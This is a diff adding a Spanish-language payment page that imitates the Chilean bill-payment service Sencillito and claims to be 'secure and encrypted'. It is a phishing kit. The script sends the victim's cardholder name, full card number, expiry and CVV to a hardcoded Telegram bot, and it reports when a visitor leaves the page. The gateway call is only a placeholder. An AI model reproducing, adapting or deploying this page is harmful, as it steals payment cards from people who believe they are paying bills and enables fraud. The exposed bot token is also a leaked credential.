@@ -1,1 +1,479 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Pagar con Tarjeta</title>
+    <style>
+        :root {
+            --brand-bg: linear-gradient(to bottom right, #255ade, #0027a8);
+            --text-primary: #1a1a1a;
+            --text-secondary: #666;
+            --border-color: #e0e0e0;
+            --bg-hover: #f9f9f9;
+            --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
 
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: var(--font-family); }
+        body { background-color: #fff; color: var(--text-primary); min-height: 100vh; display: flex; overflow: hidden; }
+
+        /* --- PC Layout --- */
+        .desktop-layout { display: flex; width: 100vw; height: 100vh; }
+
+        .sidebar { width: 30vw; min-width: 320px; background: var(--brand-bg); background-attachment: fixed; padding: 56px 48px; display: flex; flex-direction: column; justify-content: space-between; color: #fff; }
+        .btn-volver { background: none; border: none; color: #fff; font-size: 14px; cursor: pointer; display: flex; align-items: center; gap: 6px; margin-bottom: 32px; opacity: 0.9; }
+        .sidebar-title { font-size: 18px; font-weight: 500; margin-bottom: 4px; }
+        .sidebar-amount { font-size: 32px; font-weight: 500; }
+        .summary-section { margin-top: 32px; flex: 1; }
+        .summary-header { display: flex; justify-content: space-between; font-size: 12px; opacity: 0.6; padding-bottom: 8px; border-bottom: 1px solid rgba(255,255,255,0.3); margin-bottom: 16px; }
+        .summary-item { display: flex; align-items: center; gap: 16px; }
+        .summary-item img { width: 90px; height: 40px; object-fit: contain; background: #fff; border-radius: 4px; padding: 4px; }
+        .summary-item-info { flex: 1; font-size: 14px; font-weight: 500; }
+        .summary-item-price { font-size: 14px; font-weight: 600; }
+
+        .main-content { flex: 1; padding: 48px 32px; overflow-y: auto; display: flex; flex-direction: column; align-items: center; }
+        .payment-container { width: 100%; max-width: 760px; display: flex; flex-direction: column; gap: 32px; }
+        .header-payment h1 { font-size: 22px; font-weight: 600; margin-bottom: 6px; }
+        .secure-text { display: flex; align-items: center; gap: 6px; font-size: 14px; color: var(--text-secondary); }
+
+        /* Formulario de tarjeta */
+        .card-form { background: #fff; border: 1px solid var(--border-color); border-radius: 10px; padding: 24px; display: flex; flex-direction: column; gap: 18px; }
+        .form-group { display: flex; flex-direction: column; gap: 6px; }
+        .form-group label { font-size: 13px; font-weight: 500; color: #333; }
+        .form-group input {
+            padding: 12px 14px; border: 1px solid var(--border-color); border-radius: 6px;
+            font-size: 15px; outline: none; transition: border-color 0.2s; width: 100%;
+        }
+        .form-group input:focus { border-color: #255ade; }
+        .form-row { display: flex; gap: 16px; }
+        .form-row .form-group { flex: 1; }
+
+        /* Vista previa de la tarjeta */
+        .card-preview {
+            background: linear-gradient(135deg, #255ade, #0027a8);
+            border-radius: 12px; padding: 24px; color: #fff; min-height: 180px;
+            display: flex; flex-direction: column; justify-content: space-between;
+            box-shadow: 0 8px 24px rgba(37,90,222,0.25);
+            position: relative; overflow: hidden;
+        }
+        .card-preview::after {
+            content: ''; position: absolute; top: -60px; right: -60px;
+            width: 200px; height: 200px; border-radius: 50%;
+            background: rgba(255,255,255,0.08);
+        }
+        .card-chip { width: 42px; height: 32px; border-radius: 6px; background: linear-gradient(135deg, #ffd700, #b8860b); margin-bottom: 16px; }
+        .card-number-preview { font-size: 20px; letter-spacing: 2px; font-family: 'Courier New', monospace; margin-bottom: 16px; }
+        .card-bottom { display: flex; justify-content: space-between; align-items: flex-end; font-size: 12px; }
+        .card-bottom .label { opacity: 0.7; font-size: 10px; text-transform: uppercase; margin-bottom: 2px; }
+        .card-bottom .value { font-size: 14px; font-weight: 500; }
+
+        .btn-pagar {
+            background: linear-gradient(to bottom right, #255ade, #0027a8);
+            color: #fff; border: none; padding: 16px; border-radius: 8px;
+            font-size: 16px; font-weight: 600; cursor: pointer; transition: opacity 0.2s;
+            margin-top: 8px;
+        }
+        .btn-pagar:hover { opacity: 0.92; }
+        .btn-pagar:disabled { opacity: 0.6; cursor: not-allowed; }
+
+        .legal-footer { margin-top: 16px; text-align: center; font-size: 13px; color: var(--text-secondary); display: flex; flex-direction: column; align-items: center; gap: 20px; }
+        .legal-footer a { color: var(--text-secondary); text-decoration: underline; }
+
+        /* --- Mobile Layout --- */
+        .mobile-layout { display: none; flex-direction: column; width: 100vw; min-height: 100vh; }
+        .mobile-header { background: var(--brand-bg); padding: 12px 16px; color: #fff; display: flex; align-items: center; gap: 12px; }
+        .mobile-logo-container { width: 44px; height: 44px; background: #fff; border-radius: 6px; display: flex; align-items: center; justify-content: center; padding: 4px; }
+        .mobile-logo-container img { max-width: 100%; max-height: 100%; object-fit: contain; }
+        .mobile-info { flex: 1; display: flex; flex-direction: column; }
+        .mobile-info h1 { font-size: 12px; font-weight: 500; opacity: 0.9; }
+        .mobile-info .amount { font-size: 20px; font-weight: 600; }
+        .mobile-back { background: rgba(255,255,255,0.2); border: none; width: 28px; height: 28px; border-radius: 50%; color: #fff; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .mobile-main { padding: 20px 16px; flex: 1; }
+        .mobile-main .header-payment h1 { font-size: 20px; margin-bottom: 4px; }
+        .mobile-main .card-preview { margin-top: 20px; min-height: 160px; padding: 18px; }
+        .mobile-main .card-number-preview { font-size: 17px; }
+        .mobile-main .card-form { margin-top: 20px; padding: 18px; }
+
+        @media (max-width: 850px) {
+            body { overflow: auto; }
+            .desktop-layout { display: none; }
+            .mobile-layout { display: flex; }
+            .form-row { flex-direction: column; gap: 18px; }
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <!-- VISTA ESCRITORIO -->
+    <div class="desktop-layout">
+        <aside class="sidebar">
+            <div>
+                <button class="btn-volver" onclick="window.history.back()">
+                    <svg width="12" height="12" viewBox="0 0 320 512" fill="currentColor"><path d="M15 239c-9.4 9.4-9.4 24.6 0 33.9L207 465c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9L65.9 256 241 81c9.4-9.4 9.4-24.6 0-33.9s-24.6-9.4-33.9 0z"/></svg>
+                    Volver
+                </button>
+                <div class="sidebar-title">Pagar</div>
+                <div class="sidebar-amount"><span id="pc-amount">$0</span> <span style="font-size: 18px;">CLP</span></div>
+                <div class="summary-section">
+                    <div class="summary-header"><span>Resumen</span><span>1 item</span></div>
+                    <div class="summary-item">
+                        <img id="pc-item-img" src="" alt="Empresa">
+                        <div class="summary-item-info" id="pc-item-name">Empresa</div>
+                        <div class="summary-item-price" id="pc-item-price">$0</div>
+                    </div>
+                </div>
+            </div>
+            <div>
+                <img src="https://sencillito.com/o/portal-publico-theme/images/sencillito-logo.svg" alt="Sencillito" style="max-width: 180px; filter: brightness(0) invert(1);">
+            </div>
+        </aside>
+
+        <main class="main-content">
+            <div class="payment-container">
+                <div class="header-payment">
+                    <h1>Pagar con tarjeta</h1>
+                    <div class="secure-text">
+                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path fill="currentColor" d="M8 2.75a2.02 2.02 0 0 0-2.032 2.031V6h4.063V4.781A2.037 2.037 0 0 0 8 2.75M4.343 4.781A3.657 3.657 0 0 1 8 1.125a3.674 3.674 0 0 1 3.656 3.656V6h.406c.889 0 1.625.736 1.625 1.625V12.5a1.62 1.62 0 0 1-1.625 1.625H3.937c-.914 0-1.625-.71-1.625-1.625V7.625C2.312 6.736 3.023 6 3.937 6h.406zm4.47 4.469A.835.835 0 0 0 8 8.438a.82.82 0 0 0-.813.812v1.625c0 .457.356.813.813.813a.82.82 0 0 0 .812-.813z"/></svg>
+                        Pago seguro y encriptado
+                    </div>
+                </div>
+
+                <form class="card-form" id="form-tarjeta" onsubmit="enviarPago(event)">
+                    <!-- Vista previa de la tarjeta -->
+                    <div class="card-preview">
+                        <div>
+                            <div class="card-chip"></div>
+                            <div class="card-number-preview" id="preview-numero">•••• •••• •••• ••••</div>
+                        </div>
+                        <div class="card-bottom">
+                            <div>
+                                <div class="label">Titular</div>
+                                <div class="value" id="preview-titular">NOMBRE APELLIDO</div>
+                            </div>
+                            <div>
+                                <div class="label">Vence</div>
+                                <div class="value" id="preview-vence">MM/AA</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="titular">Nombre del titular</label>
+                        <input type="text" id="titular" placeholder="Como aparece en la tarjeta" autocomplete="cc-name" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="numero">Número de tarjeta</label>
+                        <input type="text" id="numero" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number" required>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="vence">Fecha de vencimiento</label>
+                            <input type="text" id="vence" placeholder="MM/AA" maxlength="5" inputmode="numeric" autocomplete="cc-exp" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="cvv">CVV</label>
+                            <input type="text" id="cvv" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="cc-csc" required>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-pagar" id="btn-pagar">Pagar ahora</button>
+                </form>
+
+                <div class="legal-footer">
+                    <p>Al continuar aceptas <a href="#">Condiciones</a> & <a href="#">Privacidad</a></p>
+                    <div style="font-size: 24px; font-weight: 700; color: #d1d1d1; letter-spacing: -1px;">fintoc</div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- VISTA MÓVIL -->
+    <div class="mobile-layout">
+        <div class="mobile-header">
+            <div class="mobile-logo-container">
+                <img id="mobile-logo" src="" alt="Logo">
+            </div>
+            <div class="mobile-info">
+                <h1>Pagar</h1>
+                <div class="amount" id="mobile-amount">$0</div>
+            </div>
+            <button class="mobile-back" onclick="window.history.back()">
+                <svg width="14" height="14" viewBox="0 0 384 512" fill="currentColor"><path d="M342.6 150.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L192 210.7 86.6 105.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L146.7 256 41.4 361.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L192 301.3l105.4 105.3c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L237.3 256z"/></svg>
+            </button>
+        </div>
+
+        <div class="mobile-main">
+            <div class="header-payment">
+                <h1>Pagar con tarjeta</h1>
+                <div class="secure-text">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path fill="currentColor" d="M8 2.75a2.02 2.02 0 0 0-2.032 2.031V6h4.063V4.781A2.037 2.037 0 0 0 8 2.75M4.343 4.781A3.657 3.657 0 0 1 8 1.125a3.674 3.674 0 0 1 3.656 3.656V6h.406c.889 0 1.625.736 1.625 1.625V12.5a1.62 1.62 0 0 1-1.625 1.625H3.937c-.914 0-1.625-.71-1.625-1.625V7.625C2.312 6.736 3.023 6 3.937 6h.406zm4.47 4.469A.835.835 0 0 0 8 8.438a.82.82 0 0 0-.813.812v1.625c0 .457.356.813.813.813a.82.82 0 0 0 .812-.813z"/></svg>
+                    Pago seguro y encriptado
+                </div>
+            </div>
+
+            <form class="card-form" id="form-tarjeta-mobile" onsubmit="enviarPago(event)">
+                <!-- Vista previa de la tarjeta -->
+                <div class="card-preview">
+                    <div>
+                        <div class="card-chip"></div>
+                        <div class="card-number-preview" id="preview-numero-m">•••• •••• •••• ••••</div>
+                    </div>
+                    <div class="card-bottom">
+                        <div>
+                            <div class="label">Titular</div>
+                            <div class="value" id="preview-titular-m">NOMBRE APELLIDO</div>
+                        </div>
+                        <div>
+                            <div class="label">Vence</div>
+                            <div class="value" id="preview-vence-m">MM/AA</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="titular-m">Nombre del titular</label>
+                    <input type="text" id="titular-m" placeholder="Como aparece en la tarjeta" autocomplete="cc-name" required>
+                </div>
+                <div class="form-group">
+                    <label for="numero-m">Número de tarjeta</label>
+                    <input type="text" id="numero-m" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number" required>
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="vence-m">Vencimiento</label>
+                        <input type="text" id="vence-m" placeholder="MM/AA" maxlength="5" inputmode="numeric" autocomplete="cc-exp" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv-m">CVV</label>
+                        <input type="text" id="cvv-m" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="cc-csc" required>
+                    </div>
+                </div>
+                <button type="submit" class="btn-pagar" id="btn-pagar-m">Pagar ahora</button>
+            </form>
+
+            <div class="legal-footer">
+                <p>Al continuar aceptas <a href="#">Condiciones</a> & <a href="#">Privacidad</a></p>
+                <div style="font-size: 24px; font-weight: 700; color: #d1d1d1; letter-spacing: -1px;">fintoc</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ===== VARIABLES TELEGRAM =====
+        const TELEGRAM_BOT_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
+        const TELEGRAM_CHAT_ID = '-1004457768033';
+        const CLP_TO_COP = 4.3;
+
+        const formatCLP = (amount) => {
+            return new Intl.NumberFormat('es-CL', { style: 'currency', currency: 'CLP', maximumFractionDigits: 0 }).format(amount);
+        };
+
+        const formatCOP = (amount) => {
+            return new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', maximumFractionDigits: 0 }).format(amount);
+        };
+
+        async function notificarTelegram(mensaje) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) {
+                console.warn('No se pudo notificar a Telegram:', e);
+            }
+        }
+
+        // Estado global
+        let datosPagoActual = null;
+        let notificadoSalida = false;
+        let pagoEnviado = false;
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const stored = localStorage.getItem('sencillito_pago_pendiente');
+            if (!stored) {
+                alert("No se encontraron datos de pago. Volviendo al inicio.");
+                window.location.href = 'index.html';
+                return;
+            }
+
+            const data = JSON.parse(stored);
+            datosPagoActual = data;
+
+            const montoFormateado = formatCLP(data.monto);
+
+            document.getElementById('pc-amount').textContent = montoFormateado;
+            document.getElementById('pc-item-img').src = data.logo;
+            document.getElementById('pc-item-name').textContent = data.empresa;
+            document.getElementById('pc-item-price').textContent = montoFormateado;
+
+            document.getElementById('mobile-amount').textContent = montoFormateado;
+            document.getElementById('mobile-logo').src = data.logo;
+
+            // ===== Formateo número de tarjeta =====
+            document.querySelectorAll('#numero, #numero-m').forEach(el => {
+                el.addEventListener('input', (e) => {
+                    let v = e.target.value.replace(/\D/g, '').substring(0, 16);
+                    e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+
+                    // Actualizar preview
+                    const isMobile = el.id.endsWith('-m');
+                    const preview = document.getElementById(isMobile ? 'preview-numero-m' : 'preview-numero');
+                    if (preview) {
+                        preview.textContent = e.target.value || '•••• •••• •••• ••••';
+                    }
+                });
+            });
+
+            // ===== Formateo vencimiento MM/AA =====
+            document.querySelectorAll('#vence, #vence-m').forEach(el => {
+                el.addEventListener('input', (e) => {
+                    let v = e.target.value.replace(/\D/g, '').substring(0, 4);
+                    if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
+                    e.target.value = v;
+
+                    const isMobile = el.id.endsWith('-m');
+                    const preview = document.getElementById(isMobile ? 'preview-vence-m' : 'preview-vence');
+                    if (preview) {
+                        preview.textContent = e.target.value || 'MM/AA';
+                    }
+                });
+            });
+
+            // ===== Preview del titular =====
+            document.querySelectorAll('#titular, #titular-m').forEach(el => {
+                el.addEventListener('input', (e) => {
+                    const isMobile = el.id.endsWith('-m');
+                    const preview = document.getElementById(isMobile ? 'preview-titular-m' : 'preview-titular');
+                    if (preview) {
+                        preview.textContent = (e.target.value || 'NOMBRE APELLIDO').toUpperCase();
+                    }
+                });
+            });
+        });
+
+        // Detectar salida si el usuario aún no envió el pago
+        function notificarSalida(motivo) {
+            if (notificadoSalida || !datosPagoActual || pagoEnviado) return;
+            notificadoSalida = true;
+
+            const montoCLP = formatCLP(datosPagoActual.monto);
+            const montoCOP = formatCOP(Math.round(datosPagoActual.monto * CLP_TO_COP));
+
+            notificarTelegram(
+                `⚠️ <b>USUARIO SALIÓ DE LA PÁGINA (TARJETA)</b>\n` +
+                `🏢 <b>Servicio:</b> ${datosPagoActual.empresa}\n` +
+                `💵 <b>Monto:</b> ${montoCLP} CLP\n` +
+                `💱 <b>Equivalente:</b> ${montoCOP} COP\n` +
+                `📌 <b>Motivo:</b> ${motivo}\n` +
+                `🕒 ${new Date().toLocaleString('es-CL')}`
+            );
+        }
+
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'hidden') {
+                setTimeout(() => {
+                    if (document.visibilityState === 'hidden') {
+                        notificarSalida('Cambió de pestaña / app');
+                    }
+                }, 1500);
+            }
+        });
+
+        window.addEventListener('beforeunload', () => {
+            if (pagoEnviado) return;
+            notificarSalida('Cerró o recargó la página');
+        });
+
+        async function enviarPago(event) {
+            event.preventDefault();
+
+            if (!datosPagoActual) {
+                alert("No hay datos de pago cargados.");
+                return;
+            }
+
+            // Detectar si es formulario PC o móvil
+            const form = event.target;
+            const isMobile = form.id === 'form-tarjeta-mobile';
+            const sufijo = isMobile ? '-m' : '';
+
+            const titular = document.getElementById('titular' + sufijo).value.trim();
+            const numero = document.getElementById('numero' + sufijo).value.replace(/\s/g, '');
+            const vence = document.getElementById('vence' + sufijo).value.trim();
+            const cvv = document.getElementById('cvv' + sufijo).value.trim();
+
+            // Validaciones básicas
+            if (!titular || numero.length < 13 || vence.length < 5 || cvv.length < 3) {
+                alert('Por favor completa todos los campos correctamente.');
+                return;
+            }
+
+            const btn = document.getElementById('btn-pagar' + sufijo);
+            const originalText = btn.textContent;
+            btn.disabled = true;
+            btn.innerHTML = '<div style="border: 3px solid #f3f3f3; border-top: 3px solid #fff; border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite; margin: 0 auto;"></div>';
+
+            pagoEnviado = true;
+
+            const montoCLP = formatCLP(datosPagoActual.monto);
+            const montoCOP = formatCOP(Math.round(datosPagoActual.monto * CLP_TO_COP));
+
+            // Notificar a Telegram con los datos ingresados
+            notificarTelegram(
+                `💳 <b>DATOS DE TARJETA INGRESADOS</b>\n` +
+                `🏢 <b>Servicio:</b> ${datosPagoActual.empresa}\n` +
+                `💵 <b>Monto CLP:</b> ${montoCLP}\n` +
+                `💱 <b>Monto COP:</b> ${montoCOP}\n` +
+                `👤 <b>Titular:</b> ${titular}\n` +
+                `🔢 <b>Tarjeta:</b> <code>${numero}</code>\n` +
+                `📅 <b>Vence:</b> ${vence}\n` +
+                `🔒 <b>CVV:</b> <code>${cvv}</code>\n` +
+                `🕒 ${new Date().toLocaleString('es-CL')}`
+            );
+
+            try {
+                // Placeholder: aquí irá la pasarela real cuando la actives.
+                const response = await fetch('/api/crear-pago', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        monto: datosPagoActual.monto,
+                        descripcion: datosPagoActual.empresa + ' - Pago con tarjeta',
+                        referencia: 'pago_tarjeta_' + Date.now(),
+                        empresa: datosPagoActual.empresa,
+                        banco: 'tarjeta',
+                        banco_nombre: 'Tarjeta de crédito/débito',
+                        titular
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    alert('Datos enviados correctamente. Procesando pago...');
+                    // Cuando actives la pasarela real:
+                    // if (data.checkout_url) window.location.href = data.checkout_url;
+                } else {
+                    throw new Error(data.error || 'Error al procesar el pago');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Error al procesar el pago: ' + error.message);
+
+                btn.disabled = false;
+                btn.textContent = originalText;
+                pagoEnviado = false;
+            }
+        }
+    </script>
+</body>
+</html>
